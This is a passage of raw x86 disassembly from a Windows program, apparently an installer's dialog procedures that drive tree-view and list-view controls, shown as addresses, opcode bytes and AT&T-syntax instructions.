  405005:	69 c0 18 40 00 00    	imul   $0x4018,%eax,%eax
  40500b:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  40500f:	83 08 20             	orl    $0x20,(%eax)
  405012:	eb 0d                	jmp    0x405021
  405014:	69 c0 18 40 00 00    	imul   $0x4018,%eax,%eax
  40501a:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  40501e:	83 20 df             	andl   $0xffffffdf,(%eax)
  405021:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405028:	75 6f                	jne    0x405099
  40502a:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  405030:	0f 85 4b 02 00 00    	jne    0x405281
  405036:	8b 45 10             	mov    0x10(%ebp),%eax
  405039:	c1 e8 10             	shr    $0x10,%eax
  40503c:	66 3d 01 00          	cmp    $0x1,%ax
  405040:	0f 85 3b 02 00 00    	jne    0x405281
  405046:	53                   	push   %ebx
  405047:	53                   	push   %ebx
  405048:	68 47 01 00 00       	push   $0x147
  40504d:	ff 75 f8             	push   -0x8(%ebp)
  405050:	ff d6                	call   *%esi
  405052:	83 f8 ff             	cmp    $0xffffffff,%eax
  405055:	0f 84 26 02 00 00    	je     0x405281
  40505b:	53                   	push   %ebx
  40505c:	50                   	push   %eax
  40505d:	68 50 01 00 00       	push   $0x150
  405062:	ff 75 f8             	push   -0x8(%ebp)
  405065:	ff d6                	call   *%esi
  405067:	8b f8                	mov    %eax,%edi
  405069:	83 ff ff             	cmp    $0xffffffff,%edi
  40506c:	74 08                	je     0x405076
  40506e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405071:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  405074:	75 03                	jne    0x405079
  405076:	6a 20                	push   $0x20
  405078:	5f                   	pop    %edi
  405079:	57                   	push   %edi
  40507a:	e8 1a c2 ff ff       	call   0x401299
  40507f:	57                   	push   %edi
  405080:	53                   	push   %ebx
  405081:	68 20 04 00 00       	push   $0x420
  405086:	ff 75 08             	push   0x8(%ebp)
  405089:	ff d6                	call   *%esi
  40508b:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  40508f:	89 5d 14             	mov    %ebx,0x14(%ebp)
  405092:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  405099:	b8 00 02 00 00       	mov    $0x200,%eax
  40509e:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4050a1:	75 08                	jne    0x4050ab
  4050a3:	53                   	push   %ebx
  4050a4:	53                   	push   %ebx
  4050a5:	50                   	push   %eax
  4050a6:	ff 75 fc             	push   -0x4(%ebp)
  4050a9:	ff d6                	call   *%esi
  4050ab:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4050b2:	75 32                	jne    0x4050e6
  4050b4:	a1 2c 02 45 00       	mov    0x45022c,%eax
  4050b9:	3b c3                	cmp    %ebx,%eax
  4050bb:	74 07                	je     0x4050c4
  4050bd:	50                   	push   %eax
  4050be:	ff 15 40 80 40 00    	call   *0x408040
  4050c4:	a1 40 02 45 00       	mov    0x450240,%eax
  4050c9:	3b c3                	cmp    %ebx,%eax
  4050cb:	74 07                	je     0x4050d4
  4050cd:	50                   	push   %eax
  4050ce:	ff 15 28 81 40 00    	call   *0x408128
  4050d4:	89 1d 2c 02 45 00    	mov    %ebx,0x45022c
  4050da:	89 1d 40 02 45 00    	mov    %ebx,0x450240
  4050e0:	89 1d 60 af 47 00    	mov    %ebx,0x47af60
  4050e6:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4050ed:	0f 85 50 01 00 00    	jne    0x405243
  4050f3:	53                   	push   %ebx
  4050f4:	53                   	push   %ebx
  4050f5:	e8 f5 c0 ff ff       	call   0x4011ef
  4050fa:	8b 45 10             	mov    0x10(%ebp),%eax
  4050fd:	3b c3                	cmp    %ebx,%eax
  4050ff:	74 0e                	je     0x40510f
  405101:	83 f8 ff             	cmp    $0xffffffff,%eax
  405104:	74 01                	je     0x405107
  405106:	48                   	dec    %eax
  405107:	50                   	push   %eax
  405108:	6a 08                	push   $0x8
  40510a:	e8 5d fb ff ff       	call   0x404c6c
  40510f:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  405112:	74 3f                	je     0x405153
  405114:	ff 35 40 02 45 00    	push   0x450240
  40511a:	e8 c3 c1 ff ff       	call   0x4012e2
  40511f:	8b f8                	mov    %eax,%edi
  405121:	57                   	push   %edi
  405122:	e8 72 c1 ff ff       	call   0x401299
  405127:	33 c0                	xor    %eax,%eax
  405129:	33 c9                	xor    %ecx,%ecx
  40512b:	3b fb                	cmp    %ebx,%edi
  40512d:	7e 0e                	jle    0x40513d
  40512f:	8b 55 ec             	mov    -0x14(%ebp),%edx
  405132:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  405135:	74 01                	je     0x405138
  405137:	41                   	inc    %ecx
  405138:	40                   	inc    %eax
  405139:	3b c7                	cmp    %edi,%eax
  40513b:	7c f2                	jl     0x40512f
  40513d:	53                   	push   %ebx
  40513e:	51                   	push   %ecx
  40513f:	68 4e 01 00 00       	push   $0x14e
  405144:	ff 75 f8             	push   -0x8(%ebp)
  405147:	ff d6                	call   *%esi
  405149:	89 7d 14             	mov    %edi,0x14(%ebp)
  40514c:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  405153:	53                   	push   %ebx
  405154:	53                   	push   %ebx
  405155:	e8 95 c0 ff ff       	call   0x4011ef
  40515a:	a1 40 02 45 00       	mov    0x450240,%eax
  40515f:	39 1d 2c af 47 00    	cmp    %ebx,0x47af2c
  405165:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405168:	a1 28 af 47 00       	mov    0x47af28,%eax
  40516d:	c7 45 c8 30 f0 00 00 	movl   $0xf030,-0x38(%ebp)
  405174:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  405177:	0f 8e 9c 00 00 00    	jle    0x405219
  40517d:	8d 78 08             	lea    0x8(%eax),%edi
  405180:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405183:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405186:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  405189:	3b c3                	cmp    %ebx,%eax
  40518b:	74 74                	je     0x405201
  40518d:	8b 0f                	mov    (%edi),%ecx
  40518f:	89 45 c0             	mov    %eax,-0x40(%ebp)
  405192:	f6 c5 01             	test   $0x1,%ch
  405195:	c7 45 bc 08 00 00 00 	movl   $0x8,-0x44(%ebp)
  40519c:	74 11                	je     0x4051af
  40519e:	8d 47 10             	lea    0x10(%edi),%eax
  4051a1:	c7 45 bc 09 00 00 00 	movl   $0x9,-0x44(%ebp)
  4051a8:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4051ab:	80 67 01 fe          	andb   $0xfe,0x1(%edi)
  4051af:	f6 c1 40             	test   $0x40,%cl
  4051b2:	74 05                	je     0x4051b9
  4051b4:	6a 03                	push   $0x3
  4051b6:	58                   	pop    %eax
  4051b7:	eb 0e                	jmp    0x4051c7
  4051b9:	8b c1                	mov    %ecx,%eax
  4051bb:	83 e0 01             	and    $0x1,%eax
  4051be:	40                   	inc    %eax
  4051bf:	f6 c1 10             	test   $0x10,%cl
  4051c2:	74 03                	je     0x4051c7
  4051c4:	83 c0 03             	add    $0x3,%eax
  4051c7:	8b d1                	mov    %ecx,%edx
  4051c9:	ff 75 c0             	push   -0x40(%ebp)
  4051cc:	c1 e0 0b             	shl    $0xb,%eax
  4051cf:	83 e2 08             	and    $0x8,%edx
  4051d2:	0b c2                	or     %edx,%eax
  4051d4:	8b d1                	mov    %ecx,%edx
  4051d6:	c1 f9 05             	sar    $0x5,%ecx
  4051d9:	03 c0                	add    %eax,%eax
  4051db:	83 e2 20             	and    $0x20,%edx
  4051de:	83 e1 01             	and    $0x1,%ecx
  4051e1:	0b c2                	or     %edx,%eax
  4051e3:	41                   	inc    %ecx
  4051e4:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4051e7:	51                   	push   %ecx
  4051e8:	68 02 11 00 00       	push   $0x1102
  4051ed:	ff 75 fc             	push   -0x4(%ebp)
  4051f0:	ff d6                	call   *%esi
  4051f2:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4051f5:	50                   	push   %eax
  4051f6:	53                   	push   %ebx
  4051f7:	68 3f 11 00 00       	push   $0x113f
  4051fc:	ff 75 fc             	push   -0x4(%ebp)
  4051ff:	ff d6                	call   *%esi
  405201:	ff 45 f0             	incl   -0x10(%ebp)
  405204:	81 c7 18 40 00 00    	add    $0x4018,%edi
  40520a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40520d:	3b 05 2c af 47 00    	cmp    0x47af2c,%eax
  405213:	0f 8c 67 ff ff ff    	jl     0x405180
  405219:	6a 01                	push   $0x1
  40521b:	53                   	push   %ebx
  40521c:	ff 75 fc             	push   -0x4(%ebp)
  40521f:	ff 15 14 82 40 00    	call   *0x408214
  405225:	a1 bc 2e 47 00       	mov    0x472ebc,%eax
  40522a:	39 58 10             	cmp    %ebx,0x10(%eax)
  40522d:	74 14                	je     0x405243
  40522f:	6a 05                	push   $0x5
  405231:	e8 89 f9 ff ff       	call   0x404bbf
  405236:	50                   	push   %eax
  405237:	6a fb                	push   $0xfffffffb
  405239:	68 ff 03 00 00       	push   $0x3ff
  40523e:	e8 64 f9 ff ff       	call   0x404ba7
  405243:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  40524a:	75 35                	jne    0x405281
  40524c:	f6 05 fd ae 47 00 01 	testb  $0x1,0x47aefd
  405253:	74 2c                	je     0x405281
  405255:	33 c0                	xor    %eax,%eax
  405257:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  40525b:	8b 35 68 82 40 00    	mov    0x408268,%esi
  405261:	0f 94 c0             	sete   %al
  405264:	c1 e0 03             	shl    $0x3,%eax
  405267:	8b f8                	mov    %eax,%edi
  405269:	57                   	push   %edi
  40526a:	ff 75 fc             	push   -0x4(%ebp)
  40526d:	ff d6                	call   *%esi
  40526f:	57                   	push   %edi
  405270:	68 fe 03 00 00       	push   $0x3fe
  405275:	ff 75 08             	push   0x8(%ebp)
  405278:	ff 15 e4 81 40 00    	call   *0x4081e4
  40527e:	50                   	push   %eax
  40527f:	ff d6                	call   *%esi
  405281:	ff 75 14             	push   0x14(%ebp)
  405284:	ff 75 10             	push   0x10(%ebp)
  405287:	ff 75 0c             	push   0xc(%ebp)
  40528a:	e8 09 f0 ff ff       	call   0x404298
  40528f:	5f                   	pop    %edi
  405290:	5e                   	pop    %esi
  405291:	5b                   	pop    %ebx
  405292:	c9                   	leave
  405293:	c2 10 00             	ret    $0x10
  405296:	55                   	push   %ebp
  405297:	8b ec                	mov    %esp,%ebp
  405299:	53                   	push   %ebx
  40529a:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40529d:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  4052a3:	57                   	push   %edi
  4052a4:	75 14                	jne    0x4052ba
  4052a6:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4052aa:	75 59                	jne    0x405305
  4052ac:	68 13 04 00 00       	push   $0x413
  4052b1:	e8 c7 ef ff ff       	call   0x40427d
  4052b6:	33 c0                	xor    %eax,%eax
  4052b8:	eb 62                	jmp    0x40531c
  4052ba:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  4052c0:	75 20                	jne    0x4052e2
  4052c2:	ff 75 08             	push   0x8(%ebp)
  4052c5:	ff 15 c8 81 40 00    	call   *0x4081c8
  4052cb:	85 c0                	test   %eax,%eax
  4052cd:	74 36                	je     0x405305
  4052cf:	6a 01                	push   $0x1
  4052d1:	ff 75 08             	push   0x8(%ebp)
  4052d4:	e8 13 f9 ff ff       	call   0x404bec
  4052d9:	8b f8                	mov    %eax,%edi
  4052db:	bb 19 04 00 00       	mov    $0x419,%ebx
  4052e0:	eb 03                	jmp    0x4052e5
  4052e2:	8b 7d 14             	mov    0x14(%ebp),%edi
  4052e5:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  4052eb:	75 1b                	jne    0x405308
  4052ed:	39 3d 34 02 45 00    	cmp    %edi,0x450234
  4052f3:	74 13                	je     0x405308
  4052f5:	57                   	push   %edi
  4052f6:	6a 06                	push   $0x6
  4052f8:	89 3d 34 02 45 00    	mov    %edi,0x450234
  4052fe:	e8 69 f9 ff ff       	call   0x404c6c
  405303:	eb 03                	jmp    0x405308
  405305:	8b 7d 14             	mov    0x14(%ebp),%edi
  405308:	57                   	push   %edi
  405309:	ff 75 10             	push   0x10(%ebp)
  40530c:	53                   	push   %ebx
  40530d:	ff 75 08             	push   0x8(%ebp)
  405310:	ff 35 3c 02 45 00    	push   0x45023c
  405316:	ff 15 c4 81 40 00    	call   *0x4081c4
  40531c:	5f                   	pop    %edi
  40531d:	5b                   	pop    %ebx
  40531e:	5d                   	pop    %ebp
  40531f:	c2 10 00             	ret    $0x10
  405322:	55                   	push   %ebp
  405323:	8b ec                	mov    %esp,%ebp
  405325:	83 ec 30             	sub    $0x30,%esp
  405328:	a1 c4 2e 47 00       	mov    0x472ec4,%eax
  40532d:	53                   	push   %ebx
  40532e:	56                   	push   %esi
  40532f:	57                   	push   %edi
  405330:	33 ff                	xor    %edi,%edi
  405332:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405335:	3b c7                	cmp    %edi,%eax
  405337:	0f 84 b1 00 00 00    	je     0x4053ee
  40533d:	8b 1d b4 af 47 00    	mov    0x47afb4,%ebx
  405343:	be 28 82 44 00       	mov    $0x448228,%esi
  405348:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40534b:	83 e3 01             	and    $0x1,%ebx
  40534e:	75 09                	jne    0x405359
  405350:	ff 75 08             	push   0x8(%ebp)
  405353:	56                   	push   %esi
  405354:	e8 83 0f 00 00       	call   0x4062dc
  405359:	56                   	push   %esi
  40535a:	e8 71 0f 00 00       	call   0x4062d0
  40535f:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  405362:	89 45 08             	mov    %eax,0x8(%ebp)
  405365:	74 1b                	je     0x405382
  405367:	ff 75 0c             	push   0xc(%ebp)
  40536a:	e8 61 0f 00 00       	call   0x4062d0
  40536f:	03 45 08             	add    0x8(%ebp),%eax
  405372:	3d 00 80 00 00       	cmp    $0x8000,%eax
  405377:	73 75                	jae    0x4053ee
  405379:	ff 75 0c             	push   0xc(%ebp)
  40537c:	56                   	push   %esi
  40537d:	e8 54 0f 00 00       	call   0x4062d6
  405382:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  405386:	75 0d                	jne    0x405395
  405388:	56                   	push   %esi
  405389:	ff 35 a8 2e 47 00    	push   0x472ea8
  40538f:	ff 15 5c 82 40 00    	call   *0x40825c
  405395:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  405399:	75 44                	jne    0x4053df
  40539b:	57                   	push   %edi
  40539c:	57                   	push   %edi
  40539d:	68 04 10 00 00       	push   $0x1004
  4053a2:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4053a5:	ff 75 fc             	push   -0x4(%ebp)
  4053a8:	8b 35 18 82 40 00    	mov    0x408218,%esi
  4053ae:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4053b5:	ff d6                	call   *%esi
  4053b7:	2b c3                	sub    %ebx,%eax
  4053b9:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4053bc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4053bf:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4053c2:	50                   	push   %eax
  4053c3:	b8 4d 10 00 00       	mov    $0x104d,%eax
  4053c8:	2b c3                	sub    %ebx,%eax
  4053ca:	57                   	push   %edi
  4053cb:	50                   	push   %eax
  4053cc:	ff 75 fc             	push   -0x4(%ebp)
  4053cf:	ff d6                	call   *%esi
  4053d1:	57                   	push   %edi
  4053d2:	ff 75 d4             	push   -0x2c(%ebp)
  4053d5:	68 13 10 00 00       	push   $0x1013
  4053da:	ff 75 fc             	push   -0x4(%ebp)
  4053dd:	ff d6                	call   *%esi
  4053df:	3b df                	cmp    %edi,%ebx
  4053e1:	74 0b                	je     0x4053ee
  4053e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4053e6:	66 89 3c 45 28 82 44 	mov    %di,0x448228(,%eax,2)
  4053ed:	00 
  4053ee:	5f                   	pop    %edi
  4053ef:	5e                   	pop    %esi
  4053f0:	5b                   	pop    %ebx
  4053f1:	c9                   	leave
  4053f2:	c2 08 00             	ret    $0x8
  4053f5:	56                   	push   %esi
  4053f6:	8b 35 28 af 47 00    	mov    0x47af28,%esi
  4053fc:	57                   	push   %edi
  4053fd:	8b 3d 2c af 47 00    	mov    0x47af2c,%edi
  405403:	6a 00                	push   $0x0
  405405:	ff 15 a0 82 40 00    	call   *0x4082a0
  40540b:	09 05 b8 af 47 00    	or     %eax,0x47afb8
  405411:	6a 00                	push   $0x0
  405413:	e8 65 ee ff ff       	call   0x40427d
  405418:	85 ff                	test   %edi,%edi
  40541a:	74 2b                	je     0x405447
  40541c:	83 c6 0c             	add    $0xc,%esi
  40541f:	4f                   	dec    %edi
  405420:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405424:	74 0f                	je     0x405435
  405426:	ff 74 24 0c          	push   0xc(%esp)
  40542a:	ff 36                	push   (%esi)
  40542c:	e8 58 bf ff ff       	call   0x401389
  405431:	85 c0                	test   %eax,%eax
  405433:	75 0c                	jne    0x405441
  405435:	81 c6 18 40 00 00    	add    $0x4018,%esi
  40543b:	85 ff                	test   %edi,%edi
  40543d:	75 e0                	jne    0x40541f
  40543f:	eb 06                	jmp    0x405447
  405441:	ff 05 8c af 47 00    	incl   0x47af8c
  405447:	68 04 04 00 00       	push   $0x404
  40544c:	e8 2c ee ff ff       	call   0x40427d
  405451:	ff 15 9c 82 40 00    	call   *0x40829c
  405457:	a1 8c af 47 00       	mov    0x47af8c,%eax
  40545c:	5f                   	pop    %edi
  40545d:	5e                   	pop    %esi
  40545e:	c2 04 00             	ret    $0x4
  405461:	55                   	push   %ebp
  405462:	8b ec                	mov    %esp,%ebp
  405464:	83 ec 40             	sub    $0x40,%esp
  405467:	53                   	push   %ebx
  405468:	56                   	push   %esi
  405469:	8b 35 c4 2e 47 00    	mov    0x472ec4,%esi
  40546f:	33 db                	xor    %ebx,%ebx
  405471:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  405478:	57                   	push   %edi
  405479:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40547c:	0f 85 89 01 00 00    	jne    0x40560b
  405482:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  405486:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  40548a:	6a 02                	push   $0x2
  40548c:	33 c0                	xor    %eax,%eax
  40548e:	5e                   	pop    %esi
  40548f:	8d 7d e0             	lea    -0x20(%ebp),%edi
  405492:	89 75 c8             	mov    %esi,-0x38(%ebp)
  405495:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  405498:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40549b:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  40549e:	ab                   	stos   %eax,%es:(%edi)
  40549f:	ab                   	stos   %eax,%es:(%edi)
  4054a0:	a1 f4 ae 47 00       	mov    0x47aef4,%eax
  4054a5:	8b 3d e4 81 40 00    	mov    0x4081e4,%edi
  4054ab:	68 03 04 00 00       	push   $0x403
  4054b0:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4054b3:	8b 40 60             	mov    0x60(%eax),%eax
  4054b6:	ff 75 08             	push   0x8(%ebp)
  4054b9:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4054bc:	89 45 10             	mov    %eax,0x10(%ebp)
  4054bf:	ff d7                	call   *%edi
  4054c1:	68 ee 03 00 00       	push   $0x3ee
  4054c6:	a3 b0 2e 47 00       	mov    %eax,0x472eb0
  4054cb:	ff 75 08             	push   0x8(%ebp)
  4054ce:	ff d7                	call   *%edi
  4054d0:	68 f8 03 00 00       	push   $0x3f8
  4054d5:	a3 a8 2e 47 00       	mov    %eax,0x472ea8
  4054da:	ff 75 08             	push   0x8(%ebp)
  4054dd:	ff d7                	call   *%edi
  4054df:	ff 35 b0 2e 47 00    	push   0x472eb0
  4054e5:	a3 c4 2e 47 00       	mov    %eax,0x472ec4
  4054ea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4054ed:	e8 74 ed ff ff       	call   0x404266
  4054f2:	6a 04                	push   $0x4
  4054f4:	e8 c6 f6 ff ff       	call   0x404bbf
  4054f9:	a3 b4 2e 47 00       	mov    %eax,0x472eb4
  4054fe:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405501:	50                   	push   %eax
  405502:	89 1d cc 2e 47 00    	mov    %ebx,0x472ecc
  405508:	ff 75 fc             	push   -0x4(%ebp)
  40550b:	ff 15 24 82 40 00    	call   *0x408224
  405511:	56                   	push   %esi
  405512:	ff 15 e8 81 40 00    	call   *0x4081e8
  405518:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40551b:	8b 35 18 82 40 00    	mov    0x408218,%esi
  405521:	2b c8                	sub    %eax,%ecx
  405523:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405526:	50                   	push   %eax
  405527:	53                   	push   %ebx
  405528:	68 61 10 00 00       	push   $0x1061
  40552d:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  405530:	ff 75 fc             	push   -0x4(%ebp)
  405533:	ff d6                	call   *%esi
  405535:	b8 00 40 00 00       	mov    $0x4000,%eax
  40553a:	50                   	push   %eax
  40553b:	50                   	push   %eax
  40553c:	68 36 10 00 00       	push   $0x1036
  405541:	ff 75 fc             	push   -0x4(%ebp)
  405544:	ff d6                	call   *%esi
  405546:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  405549:	7c 1c                	jl     0x405567
  40554b:	ff 75 0c             	push   0xc(%ebp)
  40554e:	53                   	push   %ebx
  40554f:	68 01 10 00 00       	push   $0x1001
  405554:	ff 75 fc             	push   -0x4(%ebp)
  405557:	ff d6                	call   *%esi
  405559:	ff 75 0c             	push   0xc(%ebp)
  40555c:	53                   	push   %ebx
  40555d:	68 26 10 00 00       	push   $0x1026
  405562:	ff 75 fc             	push   -0x4(%ebp)
  405565:	ff d6                	call   *%esi
  405567:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  40556a:	7c 0e                	jl     0x40557a
  40556c:	ff 75 10             	push   0x10(%ebp)
  40556f:	53                   	push   %ebx
  405570:	68 24 10 00 00       	push   $0x1024
  405575:	ff 75 fc             	push   -0x4(%ebp)
  405578:	ff d6                	call   *%esi
  40557a:	8b 45 14             	mov    0x14(%ebp),%eax
  40557d:	ff 70 30             	push   0x30(%eax)
  405580:	6a 1b                	push   $0x1b
  405582:	ff 75 08             	push   0x8(%ebp)
  405585:	e8 a7 ec ff ff       	call   0x404231
  40558a:	f6 05 fc ae 47 00 03 	testb  $0x3,0x47aefc
  405591:	74 34                	je     0x4055c7
  405593:	53                   	push   %ebx
  405594:	ff 35 b0 2e 47 00    	push   0x472eb0
  40559a:	ff 15 68 82 40 00    	call   *0x408268
  4055a0:	f6 05 fc ae 47 00 02 	testb  $0x2,0x47aefc
  4055a7:	75 0d                	jne    0x4055b6
  4055a9:	6a 08                	push   $0x8
  4055ab:	ff 75 fc             	push   -0x4(%ebp)
  4055ae:	ff 15 68 82 40 00    	call   *0x408268
  4055b4:	eb 06                	jmp    0x4055bc
  4055b6:	89 1d b0 2e 47 00    	mov    %ebx,0x472eb0
  4055bc:	ff 35 a8 2e 47 00    	push   0x472ea8
  4055c2:	e8 9f ec ff ff       	call   0x404266
  4055c7:	68 ec 03 00 00       	push   $0x3ec
  4055cc:	ff 75 08             	push   0x8(%ebp)
  4055cf:	ff d7                	call   *%edi
  4055d1:	68 00 00 30 75       	push   $0x75300000
  4055d6:	8b f8                	mov    %eax,%edi
  4055d8:	53                   	push   %ebx
  4055d9:	68 01 04 00 00       	push   $0x401
  4055de:	57                   	push   %edi
  4055df:	ff d6                	call   *%esi
  4055e1:	f6 05 fc ae 47 00 04 	testb  $0x4,0x47aefc
  4055e8:	0f 84 fc 01 00 00    	je     0x4057ea
  4055ee:	ff 75 10             	push   0x10(%ebp)
  4055f1:	53                   	push   %ebx
  4055f2:	68 09 04 00 00       	push   $0x409
  4055f7:	57                   	push   %edi
  4055f8:	ff d6                	call   *%esi
  4055fa:	ff 75 0c             	push   0xc(%ebp)
  4055fd:	53                   	push   %ebx
  4055fe:	68 01 20 00 00       	push   $0x2001
  405603:	57                   	push   %edi
  405604:	ff d6                	call   *%esi
  405606:	e9 df 01 00 00       	jmp    0x4057ea
  40560b:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405612:	75 28                	jne    0x40563c
  405614:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405617:	50                   	push   %eax
  405618:	53                   	push   %ebx
  405619:	68 ec 03 00 00       	push   $0x3ec
  40561e:	ff 75 08             	push   0x8(%ebp)
  405621:	ff 15 e4 81 40 00    	call   *0x4081e4
  405627:	50                   	push   %eax
  405628:	68 f5 53 40 00       	push   $0x4053f5
  40562d:	53                   	push   %ebx
  40562e:	53                   	push   %ebx
  40562f:	ff 15 c0 80 40 00    	call   *0x4080c0
  405635:	50                   	push   %eax
  405636:	ff 15 20 81 40 00    	call   *0x408120
  40563c:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405643:	8b 3d 68 82 40 00    	mov    0x408268,%edi
  405649:	75 1c                	jne    0x405667
  40564b:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  405651:	75 39                	jne    0x40568c
  405653:	53                   	push   %ebx
  405654:	ff 35 b0 2e 47 00    	push   0x472eb0
  40565a:	ff d7                	call   *%edi
  40565c:	6a 08                	push   $0x8
  40565e:	56                   	push   %esi
  40565f:	ff d7                	call   *%edi
  405661:	56                   	push   %esi
  405662:	e8 ff eb ff ff       	call   0x404266
  405667:	33 f6                	xor    %esi,%esi
  405669:	46                   	inc    %esi
  40566a:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  405671:	75 54                	jne    0x4056c7
  405673:	39 1d ac 2e 47 00    	cmp    %ebx,0x472eac
  405679:	74 26                	je     0x4056a1
  40567b:	6a 78                	push   $0x78
  40567d:	c7 05 18 42 44 00 02 	movl   $0x2,0x444218
  405684:	00 00 00 
  405687:	e8 7e eb ff ff       	call   0x40420a
  40568c:	ff 75 14             	push   0x14(%ebp)
  40568f:	ff 75 10             	push   0x10(%ebp)
  405692:	ff 75 0c             	push   0xc(%ebp)
  405695:	e8 fe eb ff ff       	call   0x404298
  40569a:	5f                   	pop    %edi
  40569b:	5e                   	pop    %esi
  40569c:	5b                   	pop    %ebx
  40569d:	c9                   	leave
  40569e:	c2 10 00             	ret    $0x10
  4056a1:	6a 08                	push   $0x8
  4056a3:	ff 35 e8 ae 47 00    	push   0x47aee8
  4056a9:	ff d7                	call   *%edi
  4056ab:	39 1d 8c af 47 00    	cmp    %ebx,0x47af8c
  4056b1:	75 0e                	jne    0x4056c1
  4056b3:	a1 20 82 44 00       	mov    0x448220,%eax
  4056b8:	53                   	push   %ebx
  4056b9:	ff 70 34             	push   0x34(%eax)
  4056bc:	e8 61 fc ff ff       	call   0x405322
  4056c1:	56                   	push   %esi
  4056c2:	e8 43 eb ff ff       	call   0x40420a
  4056c7:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  4056cb:	75 bf                	jne    0x40568c
  4056cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4056d0:	39 45 10             	cmp    %eax,0x10(%ebp)
  4056d3:	75 b7                	jne    0x40568c
  4056d5:	53                   	push   %ebx
  4056d6:	53                   	push   %ebx
  4056d7:	68 04 10 00 00       	push   $0x1004
  4056dc:	50                   	push   %eax
  4056dd:	ff 15 18 82 40 00    	call   *0x408218
  4056e3:	3b c3                	cmp    %ebx,%eax
  4056e5:	89 45 0c             	mov    %eax,0xc(%ebp)
  4056e8:	0f 8e fc 00 00 00    	jle    0x4057ea
  4056ee:	ff 15 80 82 40 00    	call   *0x408280
  4056f4:	6a e1                	push   $0xffffffe1
  4056f6:	53                   	push   %ebx
  4056f7:	8b f8                	mov    %eax,%edi
  4056f9:	e8 de 0b 00 00       	call   0x4062dc
  4056fe:	50                   	push   %eax
  4056ff:	56                   	push   %esi
  405700:	53                   	push   %ebx
  405701:	57                   	push   %edi
  405702:	ff 15 7c 82 40 00    	call   *0x40827c
  405708:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40570b:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  40570f:	c1 e9 10             	shr    $0x10,%ecx
  405712:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405716:	0f bf c9             	movswl %cx,%ecx
  405719:	75 13                	jne    0x40572e
  40571b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40571e:	50                   	push   %eax
  40571f:	ff 75 fc             	push   -0x4(%ebp)
  405722:	ff 15 e0 81 40 00    	call   *0x4081e0
  405728:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40572b:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40572e:	53                   	push   %ebx
  40572f:	ff 75 08             	push   0x8(%ebp)
  405732:	53                   	push   %ebx
  405733:	51                   	push   %ecx
  405734:	50                   	push   %eax
  405735:	68 80 01 00 00       	push   $0x180
  40573a:	57                   	push   %edi
  40573b:	ff 15 78 82 40 00    	call   *0x408278
  405741:	3b c6                	cmp    %esi,%eax
